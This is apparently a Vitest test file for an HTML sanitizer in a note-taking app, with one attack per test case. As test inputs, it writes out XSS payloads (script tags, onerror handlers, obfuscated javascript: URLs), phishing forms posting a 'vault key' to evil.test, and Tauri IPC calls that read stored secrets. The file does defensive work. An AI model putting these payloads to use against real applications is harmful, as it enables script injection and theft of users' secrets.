// @vitest-environment jsdom
//
// `renderEmbeddedHtml` is the ONLY `innerHTML` in the editor, and everything it
// renders is untrusted: a raw HTML block typed into a note, an AI's MCP write,
// a docx someone dropped in. `livePreviewBlocks.test.ts` proves the widget wires
// it up; this proves the rules themselves, one attack per case.

import { describe, expect, it } from "vitest";
import { renderEmbeddedHtml } from "./sanitizeHtml";

const render = (html: string, resolveAsset = (src: string) => src) => {
  const el = document.createElement("div");
  renderEmbeddedHtml(el, html, resolveAsset);
  return el;
};

describe("renderEmbeddedHtml", () => {
  it("renders ordinary markup through", () => {
    const el = render("<h2>Title</h2><p>Body <strong>bold</strong></p>");
    expect(el.querySelector("h2")?.textContent).toBe("Title");
    expect(el.querySelector("strong")?.textContent).toBe("bold");
  });

  it("renders just the body of a whole document", () => {
    const el = render("<!DOCTYPE html><html><head><title>x</title></head><body><p>hi</p></body>");
    expect(el.innerHTML).toBe("<p>hi</p>");
  });

  it("drops every executable or style-leaking tag, whatever its case", () => {
    const el = render(
      `<SCRIPT>alert(1)</SCRIPT><style>body{display:none}</style>
       <IfRaMe src="https://evil.test"></IfRaMe><object data="x"></object>
       <embed src="x"><link rel="stylesheet" href="x"><meta charset="x"><base href="x">
       <p>kept</p>`,
    );
    for (const tag of ["script", "style", "iframe", "object", "embed", "link", "meta", "base"]) {
      expect(el.querySelector(tag), tag).toBeNull();
    }
    expect(el.textContent).toContain("kept");
  });

  it("drops a <script> nested in foreign SVG content", () => {
    // An SVG <script> has a LOWERCASE tagName; matching case-sensitively is how
    // this used to slip through.
    const el = render('<svg><script>alert(1)</script><circle r="4"></circle></svg>');
    expect(el.querySelector("script")).toBeNull();
    expect(el.querySelector("circle")).not.toBeNull();
  });

  it("strips every on* handler", () => {
    const el = render(
      '<img src="a.png" onerror="alert(1)"><div onclick="x()" ONMOUSEOVER="y()">t</div>',
    );
    const img = el.querySelector("img");
    expect(img?.getAttribute("onerror")).toBeNull();
    const div = el.querySelector("div");
    expect(div?.getAttribute("onclick")).toBeNull();
    expect(div?.getAttribute("onmouseover")).toBeNull();
  });

  it("strips inline styles (fixed full-screen overlays spoof the UI)", () => {
    const el = render('<div style="position:fixed;inset:0">t</div>');
    expect(el.querySelector("div")?.getAttribute("style")).toBeNull();
  });

  it("drops javascript: URLs on both href and src", () => {
    const el = render(
      '<a href="javascript:alert(1)">a</a><img src="javascript:alert(1)"><img src="java\tscript:alert(1)">',
    );
    // The anchor loses its href either way (see below); the point is that it is
    // not rewired into a clickable external link.
    expect(el.querySelector("a")?.getAttribute("data-href")).toBeNull();
    for (const img of Array.from(el.querySelectorAll("img"))) {
      expect(img.getAttribute("src") ?? "").not.toMatch(/script:/i);
    }
  });

  it("keeps data:image but not other data: URLs", () => {
    const el = render(
      '<img id="ok" src="data:image/png;base64,iVBOR"><img id="bad" src="data:text/html,<b>x">',
    );
    expect(el.querySelector("#ok")?.getAttribute("src")).toContain("data:image/png");
    expect(el.querySelector("#bad")?.getAttribute("src")).toBeNull();
  });

  it("resolves <img src> through the supplied resolver", () => {
    const el = render('<img src="/attachments/ab12.png">', (src) => `asset://localhost${src}`);
    expect(el.querySelector("img")?.getAttribute("src")).toBe(
      "asset://localhost/attachments/ab12.png",
    );
  });

  it("rewires anchors so a click can't navigate the app away", () => {
    const el = render(
      '<a href="https://example.test/x">web</a><a href="mailto:a@b.test">mail</a><a href="/local.md">rel</a>',
    );
    const [web, mail, rel] = Array.from(el.querySelectorAll("a"));
    expect(web.getAttribute("href")).toBeNull();
    expect(web.getAttribute("data-href")).toBe("https://example.test/x");
    expect(web.classList.contains("cm-md-link")).toBe(true);
    expect(mail.getAttribute("data-href")).toBe("mailto:a@b.test");
    // A vault-relative link is not an external target: href removed, no rewire.
    expect(rel.getAttribute("href")).toBeNull();
    expect(rel.getAttribute("data-href")).toBeNull();
  });

  // Red team 3: a note must not be able to swap the app window for a look-alike
  // page ("Restore your vault key: type your 24 words") or reach IPC.
  it("no element in a note can navigate the app window: SVG links, image maps, forms", () => {
    const el = render(
      `<svg><a href="https://evil.test/restore"><text>Restore</text></a>
         <a xlink:href="https://evil.test/x"><text>x</text></a></svg>
       <map name="m"><area href="https://evil.test/area" shape="rect" coords="0,0,9,9"></map>
       <form action="https://evil.test/collect" method="post"><input name="words"><button>Restore vault key</button></form>
       <button form="f" formaction="https://evil.test/f">Go</button>
       <math><mi href="https://evil.test/m">x</mi></math>
       <frameset><frame src="https://evil.test/f"></frameset>`,
    );
    for (const node of Array.from(el.querySelectorAll("*"))) {
      for (const name of ["href", "xlink:href", "action", "formaction"]) {
        expect(node.getAttribute(name), `${node.tagName} ${name}`).toBeNull();
      }
    }
    expect(el.querySelector("form")).toBeNull();
    expect(el.querySelector("frame")).toBeNull();
    // Content survives as inert text, and an external SVG link is still openable the safe way.
    expect(el.textContent).toContain("Restore vault key");
  });

  it("an IPC payload in a note is dropped, never rendered as script", () => {
    const el = render(
      `<script>window.__TAURI_INTERNALS__.invoke("vault_secret_get",{key:"vk:x"})</script>
       <img src="x" onerror="__TAURI_INTERNALS__.invoke('save_text_file')">
       <iframe srcdoc="<script>parent.__TAURI_INTERNALS__</script>"></iframe>`,
    );
    expect(el.innerHTML).not.toContain("__TAURI_INTERNALS__");
  });
});
